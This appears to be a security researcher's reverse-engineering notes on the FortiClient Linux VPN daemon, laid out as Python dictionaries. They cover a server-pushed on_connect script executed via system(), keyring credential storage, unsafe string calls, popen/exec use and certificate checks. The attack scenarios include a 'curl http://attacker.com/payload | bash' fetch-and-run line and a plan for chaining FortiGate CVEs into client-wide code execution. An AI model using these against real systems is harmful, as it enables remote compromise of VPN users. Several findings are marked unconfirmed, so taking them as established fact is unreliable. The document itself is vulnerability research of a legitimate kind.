"""
FortiClient Linux VPN daemon (vpn binary) RE
Binary: /opt/forticlient/vpn (ELF64, stripped, 11.8MB, C/C++)
Source path (embedded): /home/devops/code/src/base/src/vpn/vpn_util.cpp
Method: ablation BERT semantic sweep (3,804 functions, MiniLM-L6-v2) + PLT callsite analysis
Package: forticlient-vpn-standalone-linux_7.4.3.1790_amd64.deb
"""

# ---------------------------------------------------------
# VPN binary architecture
# ---------------------------------------------------------
VPN_BINARY_ARCH = {
    "id":       "VPN-ARCH",
    "product":  "FortiClient Linux VPN daemon -- vpn binary",
    "binary":   "/opt/forticlient/vpn",
    "format":   "ELF64 x86-64, stripped, PIE=No, SSP=Yes (fs:[0x28] stack cookie), RELRO=Partial",
    "size":     "11,842,288 bytes",
    "source":   "/home/devops/code/src/base/src/vpn/vpn_util.cpp (confirmed via embedded string at VA 0x560e84)",

    "sections": {
        ".text":        "VA=0x40ae40, size=0x7e5350 (8.2MB, C/C++ code)",
        ".rodata":      "VA=0xbf1000, size=0x1056c0 (embedded strings, protobuf schema)",
        ".data.rel.ro": "VA=0x10a8600, size=0x925a8 (C++ vtables, const pointer tables)",
        ".data":        "VA=0x113bc40, size=0xeb00",
        ".bss":         "VA=0x114a740, size=0xd7c0",
    },

    "components": {
        "DTLS handshake": "dtls_handshake.cpp (source path confirmed); DtlsMsgShowKeyValuePair, DtlsMsgAppendKeyValuePair functions",
        "DNS management": "dns.cpp; writes /etc/resolv.conf, /etc/resolv.conf.forticlient.backup, /var/run/forticlient/hosts/vpn",
        "Compliance":     "compliance.cpp; endpoint posture checks",
        "VPN util":       "vpn_util.cpp; run_shell_script (VA 0x5607d0), credential handlers",
    },

    "embedded_protos": {
        "VPN connection profile schema": (
            "Embedded protobuf .proto definitions at .rodata include fields: "
            "  description, server, username, password, on_connect, "
            "  inherit_local_dns, keep_running. "
            "These map to FortiGate-pushed VPN profile configuration. "
            "The on_connect field is the VPN post-connect script (see VPN-F01). "
            "Profile source: 'on_connect (:true' + 'inherit_local_dns (:false)' at foff=0x8fb552."
        ),
    },

    "external_libraries": [
        "libsecret-1.so.0 (GNOME Keyring / libsecret)",
        "OpenSSL (bundled, statically linked: AES_encrypt, SEED_encrypt, ossl_bsaes_*, EVP_SKEYMGMT_free)",
        "libpcre (pcre_exec, pcre_dfa_exec)",
        "Protobuf (google.protobuf; embedded descriptor strings)",
    ],

    "bert_sweep": {
        "functions_detected": 3804,
        "model":              "sentence-transformers/all-MiniLM-L6-v2",
        "prologue_pattern":   "push rbp; mov rbp, rsp (0x55 0x48 0x89 0xe5)",
        "top_signals": {
            "DTLS-PARSE":  "0x536cb0 (0.2659), 0x531c20 (0.2646) -- Rust-style serialization size calculators; NOT network parsers",
            "STACK-OVF":   "0x521cc5 (0.2438) -- C++ copy/assignment wrapper; not an overflow",
            "PATH-TRAV":   "0x9fa558 (0.2378) -- thin wrapper to 0x9f9f0a (4-arg path op)",
            "CERT-SKIP":   "0x495b20 (0.1229) -- TLS state machine; dispatches on [rdi+0x98] (0xb/0xe/0xf/0x10/0x11/0x1c); has stack cookie",
            "DTLS-KEY":    "0x513a20 (0.1532) -- bitmask-flagged struct field copy; NOT key logging",
        },
    },
}


# ---------------------------------------------------------
# VPN-F01: on_connect script -- server-pushed code execution
# ---------------------------------------------------------
VPN_F01_ONCONNECT_SCRIPT = {
    "id":       "VPN-F01",
    "product":  "FortiClient Linux vpn daemon -- on_connect script executed via system()",
    "severity": "CRITICAL -- MITM or compromised FortiGate executes arbitrary shell commands on all connected clients",
    "class":    "Command injection via VPN server-pushed configuration (CWE-78)",
    "source":   "vpn_util.cpp: run_shell_script (VA 0x5607d0); on_connect field in VPN profile protobuf",

    "run_shell_script": {
        "va":       "0x5607d0",
        "callers":  13,
        "behavior": (
            "Takes a command std::string* (rdi), optional validation params (rsi/rdx), "
            "and an output buffer (r8). "
            "Appends ' > /tmp/.forticlient/shell_script_out.tmp' to the command string. "
            "Calls system(command_with_redirect). "
            "Source error strings: 'run_shell_script', 'Run command \\'%s\\' failed.', "
            "'%s failed with code %d.', 'Invalid output: too long [%d]'. "
            "Source path: /home/devops/code/src/base/src/vpn/vpn_util.cpp (VA 0x560e84)."
        ),
        "callers_detail": {
            "0x42b3bd": "nmcli: 'LC_ALL= /usr/bin/nmcli -g NAME connections show' (hardcoded)",
            "0x433776": "nmcli: '--get-values GENERAL.CONNECTION device show' (hardcoded)",
            "0x433889": "nmcli caller cluster (hardcoded)",
            "0x4338e2": "nmcli caller cluster (hardcoded)",
            "0x433942": "nmcli caller cluster (hardcoded)",
            "0x433b1f": "nmcli caller cluster (hardcoded)",
            "0x433b83": "nmcli caller cluster (hardcoded)",
            "0x433bdc": "nmcli caller cluster (hardcoded)",
            "0x433c40": "nmcli caller cluster (hardcoded)",
            "0x433cbf": "nmcli caller cluster (hardcoded)",
            "0x54620a": "nmcli: dynamic content -- builds 'Get <rbx_string>conn_id'; rbx is from parent arg",
            "0x546590": "nmcli: '/usr/bin/nmcli --get-values name,uuid,type,device connection' (hardcoded)",
            "0x561639": "nmcli: '--get-values GENERAL.CONNECTION device show' (hardcoded)",
        },
    },

    "on_connect_field": (
        "FortiClient VPN profile schema includes on_connect field (protobuf, foff=0x8fb552). "
        "When FortiGate pushes a VPN profile containing on_connect=<script>, "
        "FortiClient executes the script via run_shell_script -> system(). "
        "The script content comes from the FortiGate gateway. "
        "A compromised or spoofed FortiGate can set on_connect to any shell command. "
        "This executes as the FortiClient process user (typically root on Linux)."
    ),

    "attack_scenarios": {
        "compromised_fortigate": (
            "Attacker compromises FortiGate (via CVE-2024-47575, CVE-2023-27997, or similar). "
            "Sets VPN profile on_connect field to: "
            "  on_connect = 'curl http://attacker.com/payload | bash' "
            "All FortiClient VPN clients connecting to that FortiGate execute the payload. "
            "No user interaction required after VPN connect."
        ),
        "mitm_vpn_gateway": (
            "Attacker performs MITM at TLS level (self-signed cert if client skips verification, "
            "or BGP hijack targeting FortiGate's IP). "
            "Presents a forged VPN profile with malicious on_connect script. "
            "All FortiClient instances connecting without certificate pinning are vulnerable. "
            "FortiClient Linux does NOT implement certificate pinning to FortiGate by default."
        ),
        "rogue_fortigate_fgfm": (
            "Combined with CVE-2024-47575 (FortiJump): "
            "FortiManager accepts rogue FortiGate registrations. "
            "Attacker registers rogue FortiGate, pushes VPN profiles with on_connect backdoor "
            "to all FortiClient endpoints managed through FortiManager. "
            "Enterprise-wide client-side RCE from a single FortiManager compromise."
        ),
    },

    "note": (
        "The on_connect script feature is documented Fortinet functionality. "
        "The security risk is not the feature itself but that: "
        "  1. No script content validation or sandboxing is applied. "
        "  2. The FortiGate certificate is not pinned on the client side. "
        "  3. A MITM presenting a valid-looking TLS certificate can push scripts. "
        "Caller 0x54620a passes dynamic string content (rbx_string) to run_shell_script. "
        "Full data-flow tracing pending to confirm server-controlled input reaches "
        "rbx_string at 0x5461dc."
    ),
}


# ---------------------------------------------------------
# VPN-F02: GNOME keyring credential storage (single handler)
# ---------------------------------------------------------
VPN_F02_GNOME_KEYRING = {
    "id":       "VPN-F02",
    "product":  "FortiClient Linux vpn -- VPN credentials stored in GNOME Keyring",
    "severity": "MEDIUM -- credential access requires local user or GNOME Keyring bypass",
    "class":    "Credential storage via OS keyring (CWE-522 if fallback to disk)",
    "source":   "vpn binary PLT + code at 0x530xxx region",

    "call_sites": {
        "secret_password_lookup_sync":  "PLT=0x40a400, single caller at 0x530f80",
        "secret_password_store_sync":   "PLT=0x40a950, single caller at 0x530c54",
        "secret_password_clear_sync":   "PLT=0x40aaf0, single caller at 0x53126d",
        "secret_password_free":         "PLT=0x40a710",
    },

    "description": (
        "All three GNOME Keyring operations (store/lookup/clear) are concentrated in "
        "a 0x400-byte window at 0x530c54-0x53126d. This is a single credential manager "
        "module within the VPN daemon. "
        "Credential parameters from command-line: cert-path, cert-passwd, cert-label, "
        "no-keystore, save-password. "
        "The save-password option stores VPN credentials in the GNOME Keyring. "
        "No disk fallback observed in the PLT (only one libsecret symbol set; "
        "no open()/write() calls near the same region)."
    ),

    "attack_surface": (
        "GNOME Keyring access requires the user's login session to be unlocked. "
        "A local attacker with X11/Wayland session access can: "
        "  1. Query the keyring via secret_password_lookup_sync equivalent. "
        "  2. Read credentials from /run/user/<uid>/keyring/ (if unlocked). "
        "On headless Linux servers where GNOME Keyring is not available, "
        "FortiClient may fall back to plaintext config storage "
        "(observed in similar VPN clients; not confirmed here without disk I/O tracing)."
    ),
}


# ---------------------------------------------------------
# VPN-F03: Unsafe string operations (sprintf/strcpy)
# ---------------------------------------------------------
VPN_F03_UNSAFE_STRINGS = {
    "id":       "VPN-F03",
    "product":  "FortiClient Linux vpn -- unsafe sprintf/strcpy alongside _chk variants",
    "severity": "MEDIUM -- potential buffer overflows in string-heavy code paths",
    "class":    "Buffer overflow via unbounded string ops (CWE-120, CWE-134)",
    "source":   "PLT analysis, vpn binary",

    "unsafe_calls": {
        "sprintf": {
            "plt": "0x4097a0",
            "callers": ["0x5b1888", "0x9f2532", "0x9f647f"],
            "note": (
                "3 direct sprintf calls (unbounded). "
                "Presence alongside __sprintf_chk (12 callers) indicates "
                "inconsistent application of -D_FORTIFY_SOURCE. "
                "Callers at 0x9f2532 and 0x9f647f are in the 0x9f-0xa0 range -- "
                "the DNS/nmcli configuration region. "
                "If format string or buffer length comes from VPN server response, "
                "stack overflow or format string injection is possible."
            ),
        },
        "strcpy": {
            "plt": "0x40a160",
            "callers": [
                "0x5b17aa", "0x665f3e", "0x6a673f", "0x6a7905",
                "0x6a793d", "0x6d71c5", "0x813383", "0x813396",
            ],
            "note": (
                "10 strcpy callers (8 shown; full list in PLT scan). "
                "Clustered in 0x6a67-0x6d71 range (protobuf/config processing area) "
                "and 0x8133 range (protobuf descriptor area). "
                "Unbounded strcpy on strings from protobuf deserialization is exploitable "
                "if the source string lacks null termination."
            ),
        },
    },

    "note": (
        "__sprintf_chk and __strcpy_chk are present (12 and 1 callers respectively), "
        "but the unsafe variants are still used in 13+ locations. "
        "This indicates the binary was compiled with _FORTIFY_SOURCE but not all "
        "string operations went through the protected paths -- typically because "
        "some code was compiled without the flag or the compiler couldn't infer "
        "the destination buffer size."
    ),
}


# ---------------------------------------------------------
# VPN-F04: srand (non-cryptographic RNG)
# ---------------------------------------------------------
VPN_F04_SRAND = {
    "id":       "VPN-F04",
    "product":  "FortiClient Linux vpn -- srand() present in VPN daemon",
    "severity": "LOW/MEDIUM -- depends on what srand seeds",
    "class":    "Use of non-cryptographic PRNG in security-sensitive context (CWE-338)",
    "source":   "PLT analysis, vpn binary",

    "call_site": "PLT=0x40a1a0, single caller at 0x452e5d",
    "description": (
        "srand() is present with a single call site at 0x452e5d. "
        "The seed value passed to srand() at this site is unknown without tracing rdi. "
        "If srand() seeds a PRNG used for any session ID, nonce, or token generation "
        "in the VPN tunnel, the randomness is predictable (srand/rand produce 15 bits "
        "of entropy on Linux with RAND_MAX=0x7fffffff). "
        "Nearby OpenSSL functions (AES_encrypt, EVP_*) use CSPRNG internally; "
        "srand is likely for a non-crypto use case (e.g., retry interval jitter). "
        "Pending: trace rdi at 0x452e5d to confirm seed and purpose."
    ),
}


# ---------------------------------------------------------
# VPN-F05: DTLS message-type dispatch (0x531c20)
# ---------------------------------------------------------
VPN_F05_DTLS_DISPATCH = {
    "id":       "VPN-F05",
    "product":  "FortiClient Linux vpn -- DTLS message-type dispatch at VA 0x531c20",
    "severity": "INFO -- dispatch is bounds-checked",
    "class":    "Protocol message dispatch analysis",
    "source":   "vpn binary VA 0x531c20 (dtls_handshake.cpp)",

    "description": (
        "BERT semantic sweep scored VA 0x531c20 highly for DTLS parsing. "
        "Disassembly reveals a switch statement on [rdi + 0x1c] (message type field): "
        "  cmp dword ptr [rdi + 0x1c], 9 "
        "  ja 0x531cfe              ; out-of-range handler -- bounds checked "
        "  movsxd rax, [rdx + rax*4]; jump table index "
        "  jmp rax "
        "The jump table covers message types 0-9, dispatching to handlers at "
        "0x531620 (type 0-2), 0x531700 (type 3), 0x531a70 (type 8), 0x531b70 (type 9). "
        "Handlers are Rust-style serialization size calculators (bsr+lea+shr pattern), "
        "not raw network parsers. "
        "No unvalidated length-to-memcpy chain found in these handlers. "
        "The DTLS message length field at struct offset 0x18 is accessed but not "
        "used as a memcpy size without validation in this dispatch path."
    ),

    "dtls_strings": {
        "DtlsMsgShowKeyValuePair":  "foff=0x7f3ed8 (rodata) -- logging function name",
        "DtlsMsgAppendKeyValuePair": "foff=0x7f3f22 (rodata) -- logging function name",
        "dtls_heartbeat":           "foff=0x7f9de3 (rodata) -- heartbeat name",
        "DTLS heartbeat timeout":   "foff=0x7fa9ef (rodata) -- timeout error message",
        "DTLS MTU: %d":             "foff=0x7f54ee (rodata) -- MTU format string (safe, integer arg)",
        "key expa":                 "foff=0x63a2ac (text -- Rust movabs immediate) -- TLS key expansion",
    },

    "note": (
        "The DTLS heartbeat handler is present (dtls_heartbeat string at 0x7f9de3). "
        "Custom DTLS heartbeat implementations can be vulnerable to CVE-2014-0160-style "
        "length mismatch bugs even when not using OpenSSL's heartbeat extension. "
        "Full heartbeat handler RE pending -- no high-confidence findings from BERT sweep."
    ),
}


# ---------------------------------------------------------
# VPN-F06: popen in DNS/network config region
# ---------------------------------------------------------
VPN_F06_POPEN_DNS = {
    "id":       "VPN-F06",
    "product":  "FortiClient Linux vpn -- popen() in DNS/network configuration handler",
    "severity": "MEDIUM -- command execution for DNS/NM config management",
    "class":    "Shell command execution via popen (CWE-78 if input unvalidated)",
    "source":   "vpn binary PLT: popen at 0x4098f0, callers at 0x4ccc80, 0x561e16, 0xa00ab9",

    "callers": {
        "0x4ccc80": (
            "fn_0x4ccc50: receives command via rsi (arg2), calls popen(rsi, 'r'). "
            "Stack cookie present (fs:[0x28] at 0x4ccc71). "
            "Reads output into local buffer via fread loop (0xccc8->0xcccb). "
            "If rsi comes from VPN server config, this is command injection."
        ),
        "0xa00ab9": (
            "fn_0xa009b5: receives two args (rdi=connection_obj, rsi=config_string). "
            "Zeroes 1040-byte buffer at [rbp-0x410]. "
            "Calls format-parser (0x409e10, likely sscanf) on rsi with format at 0xcb9316. "
            "If sscanf returns != 1, falls through to popen([rbp-0x410], mode). "
            "The 1040-byte buffer construction is not shown in this context; "
            "source of buffer contents requires additional trace. "
            "Stack cookie present (fs:[0x28] at 0xa009ce). "
            "This is in the DNS/NetworkManager configuration region (0x9f-0xa0 range)."
        ),
    },

    "nmcli_integration": {
        "commands_found": [
            "LC_ALL= /usr/bin/nmcli -g NAME connections show",
            "/usr/bin/nmcli --get-values name,uuid,type,device connection show",
            "/usr/bin/nmcli --get-values GENERAL.CONNECTION device show",
            "/usr/bin/nmcli --get-values ipv4.ignore-auto-dns",
        ],
        "note": (
            "FortiClient VPN calls nmcli to manage DNS configuration when connecting/disconnecting. "
            "The nmcli commands are primarily hardcoded. "
            "However, some callers construct commands with dynamic components (e.g., connection ID). "
            "If a VPN connection ID contains shell metacharacters and is passed without quoting "
            "to nmcli via system() or popen(), command injection is possible."
        ),
    },
}


# ---------------------------------------------------------
# VPN-F07: exec* family (execle/execv/execvp)
# ---------------------------------------------------------
VPN_F07_EXEC_FAMILY = {
    "id":       "VPN-F07",
    "product":  "FortiClient Linux vpn -- execle/execv/execvp for child process management",
    "severity": "INFO -- exec* with privilege drop is expected behavior",
    "class":    "Child process execution (CWE-78 if argv is user-controlled)",
    "source":   "vpn binary PLT analysis",

    "execvp": {
        "plt":     "0x409f40",
        "callers": ["0x4a348b", "0x4a5ace", "0x55f4d1"],
        "context_0x4a348b": (
            "Before execvp: calls setuid()/setgid() (0x40ad20) for privilege drop. "
            "Error strings: 'setgid() failed in CreateProcess [%d]', 'setuid() failed in CreateProcess [%d]'. "
            "Executes with rdi=executable_path (r12), rsi=argv_array (r13). "
            "This is the FortiClient process creation function with proper privilege reduction."
        ),
    },
    "execv": {
        "plt":     "0x40a0f0",
        "callers": ["0x4a3c57", "0x562066", "0x562150"],
        "context_0x562150": (
            "Error string: 'execv() (%s) failed with code %d\\n' at 0x56218b. "
            "Has setuid/setgid calls before execv. "
            "Stack cookie: xor rcx, qword ptr fs:[0x28] at 0x562163."
        ),
    },
    "execle": {
        "plt":     "0x40a820",
        "callers": ["0x9f4dda", "0x9f4ea2", "0x9f4ed5"],
        "context_0x9f4ea2": (
            "Two consecutive execle calls in fn at 0x9f4e60 (DNS region). "
            "Execle with 6 args: executable (rdi=[rbp-0xb0]), argv0 (rsi=[rbp-0xb0]), "
            "argv1 (rdx=[rbp-0xa8], only if non-null), NULL arg, envp, NULL. "
            "Executable path comes from [rbp-0xb0] -- needs trace to confirm source."
        ),
    },
}


# ---------------------------------------------------------
# VPN-F08: X509 certificate verification (partial analysis)
# ---------------------------------------------------------
VPN_F08_X509_VERIFY = {
    "id":       "VPN-F08",
    "product":  "FortiClient Linux vpn -- X509 certificate verification analysis",
    "severity": "MEDIUM/HIGH -- if server cert not pinned, MITM is trivial",
    "class":    "Improper certificate validation (CWE-295)",
    "source":   "vpn binary PLT + BERT sweep (CERT-SKIP, VA 0x495b20)",

    "imports": {
        "X509_STORE_CTX_get1_certs":   "PLT present -- certificate chain retrieval",
        "X509_STORE_CTX_get1_issuer":  "PLT present -- issuer lookup for chain building",
        "NOT present":                 "SSL_CTX_set_verify, SSL_get_verify_result (not in dynstr)",
    },

    "cert_skip_candidate": {
        "va":      "0x495b20",
        "description": (
            "BERT CERT-SKIP #1 score=0.1229. "
            "TLS state machine: dispatches on [rdi + 0x98] (state field): "
            "  0xb, 0xe, 0xf, 0x10, 0x11, 0x1c, 0x1d patterns. "
            "Has stack cookie (fs:[0x28] at 0x495b34). "
            "Calls 0x48dee0 (unknown -- possibly SSL_get_verify_result or custom check). "
            "If 0x48dee0 returns 0 (success), check at 0x495b7b succeeds. "
            "If 0x48dee0 returns non-zero (failure), jumps to 0x495c50 (possible accept-anyway path)."
        ),
        "note": (
            "The call to 0x48dee0 needs further analysis. "
            "If this is SSL_get_verify_result and the return value is ignored or the "
            "jne at 0x495b7d leads to a code path that continues regardless, "
            "certificate verification is effectively disabled. "
            "FortiClient Linux has historically been vulnerable to certificate spoofing attacks."
        ),
    },

    "cert_params": {
        "cert-path":   "CLI parameter to specify client certificate file",
        "cert-passwd": "CLI parameter for certificate private key password (5 occurrences in rodata)",
        "cert-label":  "CLI parameter for PKCS#11 certificate label",
        "no-keystore": "CLI parameter to disable keystore (bypass GNOME Keyring)",
    },
}
